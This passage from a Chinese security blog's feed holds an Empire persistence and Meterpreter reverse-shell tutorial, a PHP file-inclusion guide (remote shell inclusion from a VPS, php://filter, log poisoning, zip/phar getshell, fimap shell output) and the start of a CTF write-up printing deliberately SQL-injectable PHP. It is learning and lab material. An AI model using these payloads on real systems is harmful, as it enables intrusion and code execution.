persistence/elevated/schtasks</span><br></pre></td></tr></table></figure><p>设置一下时间和Listener,然后就可以返回agent了 但是杀软会报提示 <img src="/images/2018/09/2018-09-11-13-32-52屏幕截图.png" alt="blacsheep" /> 然后就返回agent了 <img src="/images/2018/09/2018-09-11-13-36-07屏幕截图.png" alt="blacsheep" /> 可以看到权限是System <img src="/images/2018/09/2018-09-11-13-37-18屏幕截图.png" alt="blacsheep" /> 这里如果把set RegPath 的参数改为前面的注册表参数,那么就会在相应时间添加一个注册表注入后门,大家可以练习一下。</p><h2 id="反弹meterpreter">反弹meterpreter</h2><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule code_execution/invoke_shellcode</span><br></pre></td></tr></table></figure><p>填好lhost和lport,他的payload默认是https,不管就ok <img src="/images/2018/09/2018-09-11-13-59-53屏幕截图.png" alt="blacsheep" /> 然后去msf设置一下监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_https</span><br><span class="line">msf exploit(multi/handler) &gt; set lhost xx.xx.xx.xx</span><br><span class="line">msf exploit(multi/handler) &gt; set lport 4444</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure><p>返回empire进行execute <img src="/images/2018/09/2018-09-11-13-52-49屏幕截图.png" alt="blacsheep" /> 然后metasploit上面就反了一个meterpreter <img src="/images/2018/09/2018-09-11-14-10-54屏幕截图.png" alt="blacsheep" /></p><h2 id="总结">总结</h2><p>简单地对empire进行一个学习,也是对渗透学习的一个补充,后续可能还会对metasploit进行一个深入学习,挖坑待填吧...</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php文件包含总结和学习</title>
      <link href="/2018/09/07/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93%E5%92%8C%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/09/07/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93%E5%92%8C%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>很早就有写一篇总结包含漏洞文章的想法了,加上近期对包含漏洞还有了一些新的学习,都在这里简单记录下</p><h2 id="php.ini中的两个allow">php.ini中的两个allow</h2><p>即allow_url_fopen和allow_url_include allow_url_fopen表示是否允许将链接以文件的形式打开 allow_url_include表示是否允许将链接以文件形式进行包含</p><h3 id="fopen和include均打开">fopen和include均打开</h3><p>假设一个场景,我们去包含一个url 那么首先是看allow_url_fopen是否开启,如果开启再看allow_url_include是否开启 在两者都开启时就可以包含远程文件,利用也比较简单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?file=http://your_vps/shell.txt</span><br></pre></td></tr></table></figure><p>即可拿shell 如果后缀需要绕过,那么可以通过#来绕过,举个例子 后端包含代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;secret.php&quot;</span>);</span><br><span class="line">   <span class="comment">//假设$secret不可爆破</span></span><br><span class="line">   <span class="comment">//比如$secret=&quot;.alfalksfhakljsf$%YGBASasidjoasjd12&quot;;</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="variable">$secret</span>);</span><br></pre></td></tr></table></figure><p>文件的后缀我们并不知道 那么我们就可以利用url的特性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?file=http://your_vps/shell.txt%23</span><br></pre></td></tr></table></figure><p>服务器上面去包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your_vps/shell.txt#.alfalksfhakljsf$%YGBASasidjoasjd12</span><br></pre></td></tr></table></figure><p>那么井号后面的东西都无所谓了 当然,利用query什么的也都可以</p><h3 id="fopen关闭include打开">fopen关闭include打开</h3><p>这个时候是可以通过包含代码进行执行的 <img src="/images/2018/09/2018-09-07-12-12-21屏幕截图.png" alt="blacsheep" /></p><h3 id="fopen打开include关闭">fopen打开include关闭</h3><p>这个是最正常的,因为allow_url_fopen默认打开,allow_url_include默认关闭 一般来说,只打开fopen,关闭include其实并没有什么很大的作用... 但如果有这么一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$f</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;http://localhost&#x27;</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>,<span class="number">100</span>));</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果allow_url_fopen关闭,那么var_dump并不能输出,实际上在fopen的时候就会报错了 不过如果allow_url_fopen打开,那么会输出网页代码 这里仅作一个简单介绍</p><h3 id="fopen和include都关闭">fopen和include都关闭</h3><p>当然也适用fopen打开的情况</p><h4 id="包含上传的文件">包含上传的文件</h4><p>比如可以上传jpg,txt之类的,然后去包含自己上传的文件即可 <img src="/images/2018/09/2018-09-07-12-29-28屏幕截图.png" alt="blacsheep" /></p><h4 id="phpfilter的encode读文件">php://filter的encode读文件</h4><p>前提是过滤并不是那么严格,利用php://filter</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=</span><br></pre></td></tr></table></figure><p><img src="/images/2018/09/2018-09-07-12-30-30屏幕截图.png" alt="blacsheep" /> <strong>存在一些简单的绕过,比如双写绕过,大小写绕过,00截断之类的</strong></p><h4 id="phpfilter的decode执行代码">php://filter的decode执行代码</h4><p>加入对上传的文件进行了过滤,不允许上传含有特殊符号的文件,那么我们可以上传base编码的文件,然后用decode去包含 比如我们在shell.php里面写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKcGhwaW5mbygpOwo/Pgo=</span><br></pre></td></tr></table></figure><p>然后利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-decode/resource=</span><br></pre></td></tr></table></figure><figure><img src="/images/2018/09/2018-09-07-12-35-08屏幕截图.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h4 id="包含日志文件">包含日志文件</h4><p>一般来说是没有权限的,apache2的文件夹权限是默认750,access.log的权限默认640,www-data没有任何权限 这里为了演示,我给<code>chmod 777</code>了,如果实际练习后续记得改回来 <img src="/images/2018/09/2018-09-07-13-11-48屏幕截图.png" alt="blacsheep" /></p><h4 id="包含sshlog">包含sshlog</h4><p>sshlog在/var/log/auth.log,权限默认640 包含的时候用ssh连上去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>@<span class="number">127.0</span>.<span class="number">0.1</span></span><br></pre></td></tr></table></figure><p>密码随意输入,查看日志 <img src="/images/2018/09/2018-09-07-13-19-17屏幕截图.png" alt="blacsheep" /></p><h4 id="包含session">包含session</h4><p>强网杯的时候利用过 <code>session.upload_progress.enabled</code>如果打开了,我们就可以用传文件的方式传session.当然,如果开启了<code>session.upload_progress.cleanup</code>同样也是可以利用的,不过需要条件竞争,具体的wp可以去看强网杯的easy php那道题 值得一提的是这两个参数php好像是默认开启的 session一般的位置:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure><p>如果能够弄到phpinfo的话就更好说了,phpinfo中是存有session的保存位置的</p><h4 id="procselfenviron">/proc/self/environ</h4><p>利用条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.php以cgi方式运行，这样environ才会保持UA头。</span><br><span class="line">2.environ文件存储位置已知，且environ文件可读。</span><br></pre></td></tr></table></figure><p>用户的ua会存在这个文件里面,不过我本地并没有成功,可以自己去测试一下</p><h4 id="包含临时文件">包含临时文件</h4><p>随意上传一个文件到服务器都是要经过以下步骤的 <img src="/images/2018/09/804631-20151116135028890-525890377.jpg" alt="blacsheep" /> 在临时文件被删除之前可以利用条件竞争进行包含 由于包含需要知道包含的文件名。一种方法是进行暴力猜解,linux下使用的随机函数有缺陷,而window下只有65535中不同的文件名,所以这个方法是可行的。 另一种方法是配合phpinfo页面的php variables,可以直接获取到上传文件的存储路径和临时文件名,直接包含即可</p><h2 id="zip扩展">zip扩展</h2><h3 id="安装">安装</h3><p>我kali上面的php是并没有zip扩展的,可以自己去装一下 去<a href="http://pecl.php.net/package/zip" title="http://pecl.php.net/package/zip">http://pecl.php.net/package/zip</a>下载扩展 然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar -zxcf xxx.zip</span><br><span class="line">cd xxx</span><br><span class="line">phpize</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>然后去php.ini里面加上扩展就好了,so路径在/usr/lib/php20170718/ 如果没有phpize就去<code>apt-get install php7.x-dev</code> 缺少lib的话自己apt装一下</p><h3 id="利用zip协议getshell">利用zip协议getshell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@kali:/var/www/html# cat 1.jpg</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">blacsheep@kali:/var/www/html# zip -q -o 1.zip 1.jpg</span><br><span class="line">blacsheep@kali:/var/www/html# mv 1.zip 2.jpg</span><br></pre></td></tr></table></figure><p>然后去用zip协议包含就好了 <img src="/images/2018/09/2018-09-07-16-43-42屏幕截图.png" alt="blacsheep" /></p><h2 id="phar扩展">phar扩展</h2><h3 id="phar协议包含getshell">phar协议包含getshell</h3><p>同样利用前面的zip文件 <img src="/images/2018/09/2018-09-07-16-51-35屏幕截图.png" alt="blacsheep" /> 只不过里面的<code>#</code>换成了<code>/</code></p><h3 id="phar反序列化">phar反序列化</h3><p>不算文件包含,但提到了phar协议就提一下吧 原理就是<strong>php在解析phar对象的时候会导致metadata的数据被反序列化</strong> 原题是hitcon2017的baby^h-master-php-2017 然后利用点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;);</span><br></pre></td></tr></table></figure><p>然后给了一个恶意构造的phar,导致反序列化漏洞 题外话,想了解的话去看 <a href="http://localhost/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/#babyh-master-php-2017" title="http://localhost/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/#babyh-master-php-2017">http://localhost/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/#babyh-master-php-2017</a></p><h2 id="利用工具">利用工具</h2><h3 id="fimap">fimap</h3><p>一旦你的allow_url_include打开了,fimap就可以给你一个shell,当然,你也可以reverse回来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@kali:/var/www/html$ fimap --enable-color -x -u &quot;http://127.0.0.1/index.php?file=index.php&quot;</span><br><span class="line">fimap v.1.00_svn (My life for Aiur)</span><br><span class="line">:: Automatic LFI/RFI scanner and exploiter</span><br><span class="line">:: by Iman Karim (fimap.dev@gmail.com)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##########################</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">:: List of Domains ::    <span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##########################</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">[1] 127.0.0.1            <span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">[q] Quit                 <span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##########################</span></span></span><br><span class="line">Choose Domain: 1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###############################################################################################</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">:: FI Bugs on <span class="string">&#x27;127.0.0.1&#x27;</span> ::                                                                  <span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###############################################################################################</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">[1] URL: <span class="string">&#x27;/index.php?file=index.php&#x27;</span> injecting file: <span class="string">&#x27;php://input&#x27;</span> using GET-param: <span class="string">&#x27;file&#x27;</span>    <span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">[q] Quit                                                                                      <span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###############################################################################################</span></span></span><br><span class="line">Choose vulnerable script: 1</span><br><span class="line">[09:06:07] [INFO] Testing PHP-code injection thru POST...</span><br><span class="line">[09:06:08] [OUT] PHP Injection works! Testing if execution works...</span><br><span class="line">[09:06:08] [INFO] Testing execution thru &#x27;popen[b64]&#x27;...</span><br><span class="line">[09:06:08] [OUT] Execution thru &#x27;popen[b64]&#x27; works!</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###################################################</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">:: Available Attacks - PHP and SHELL access ::    <span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###################################################</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">[1] Spawn fimap shell                             <span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">[2] Spawn pentestmonkey<span class="string">&#x27;s reverse shell           #</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">[3] [Test Plugin] Show some info                  #</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">[q] Quit                                          #</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">###################################################</span></span></span><br><span class="line">Choose Attack: 1</span><br><span class="line">Please wait - Setting up shell (one request)...</span><br><span class="line">-------------------------------------------</span><br><span class="line">Welcome to fimap shell!</span><br><span class="line">Better don&#x27;t start interactive commands! ;)</span><br><span class="line">Also remember that this is not a persistent shell.</span><br><span class="line">Every command opens a new shell and quits it after that!</span><br><span class="line">Enter &#x27;q&#x27; to exit the shell.</span><br><span class="line">-------------------------------------------</span><br><span class="line">fishell@www-data:/var/www/html$&gt; id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">fishell@www-data:/var/www/html$&gt; </span><br></pre></td></tr></table></figure><h3 id="dotdotpwn">dotdotpwn</h3><p>用来fuzz文件的一个工具 首先命令使用例子</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotdotpwn -m &#x27;http-url&#x27; -u &quot;http://127.0.0.1/index.php?file=TRAVERSAL&quot; -k &quot;root&quot;</span><br></pre></td></tr></table></figure><p>给一部分结果 <img src="/images/2018/09/2018-09-07-17-09-34屏幕截图.png" alt="blacsheep" /> 可以看到工具在fuzz可能的<code>.</code>和<code>/</code>的绕过</p><hr /><p>利用暂时大概就这些了,后续有新的知识学习的话会继续补充</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WhaleCTF练习</title>
      <link href="/2018/09/05/whalectf%E7%BB%83%E4%B9%A0/"/>
      <url>/2018/09/05/whalectf%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>工作室群里甩了个比赛,简单练习一下web</p><h2 id="蓝鲸文件管理系统">蓝鲸文件管理系统</h2><p>工作室同学讲过的原题 upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: phithon</span></span><br><span class="line"><span class="comment"> * Date: 15/10/14</span></span><br><span class="line"><span class="comment"> * Time: 下午8:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.inc.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;ROOT&#x27;</span>,<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;upfile&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&quot;error&quot;</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="variable">$path_parts</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>], <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;zip&quot;</span>, <span class="string">&quot;txt&quot;</span>))) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;error extension&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>] = <span class="string">&quot;.&quot;</span> . <span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$path_parts</span>[<span class="string">&quot;filename&quot;</span>] . <span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$path_parts</span>[<span class="string">&#x27;filename&#x27;</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$path_parts</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$path_parts[&#x27;filename&#x27;]&#125;</span>&#x27; and `extension`=&#x27;<span class="subst">&#123;$path_parts[&#x27;extension&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;file is exists&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//echo $file[&quot;tmp_name&quot;], ROOT . UPLOAD_DIR . $name;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>], ROOT . UPLOAD_DIR . <span class="variable">$name</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;insert into `file` ( `filename`, `view`, `extension`) values( &#x27;<span class="subst">&#123;$path_parts[&#x27;filename&#x27;]&#125;</span>&#x27;, 0, &#x27;<span class="subst">&#123;$path_parts[&#x27;extension&#x27;]&#125;</span>&#x27;)&quot;</span>;</span><br><span class="line">            <span class="variable">$re</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$re</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">                <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;/&quot;</span> . UPLOAD_DIR . <span class="variable">$name</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your file is upload, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;<span class="subst">&#123;$url&#125;</span>\&quot; target=&#x27;_blank&#x27;&gt;<span class="subst">&#123;$url&#125;</span>&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;/\&quot;&gt;go back&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;upload error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">error_get_last</span>());</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面一个phithon表明题目来源.. 然后rename.php的主要代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: phithon</span></span><br><span class="line"><span class="comment"> * Date: 15/10/14</span></span><br><span class="line"><span class="comment"> * Time: 下午9:39</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.inc.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;ROOT&#x27;</span>,<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">&#x27;oldname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$req[&#x27;oldname&#x27;]&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;old file doesn&#x27;t exists!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>] = <span class="title function_ invoke__">basename</span>(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>]);</span><br><span class="line">        <span class="variable">$re</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;update `file` set `filename`=&#x27;<span class="subst">&#123;$req[&#x27;newname&#x27;]&#125;</span>&#x27;, `oldname`=&#x27;<span class="subst">&#123;$result[&#x27;filename&#x27;]&#125;</span>&#x27; where `fid`=<span class="subst">&#123;$result[&#x27;fid&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$re</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">errorInfo</span>());</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$oldname</span> = ROOT.UPLOAD_DIR . <span class="variable">$result</span>[<span class="string">&quot;filename&quot;</span>].<span 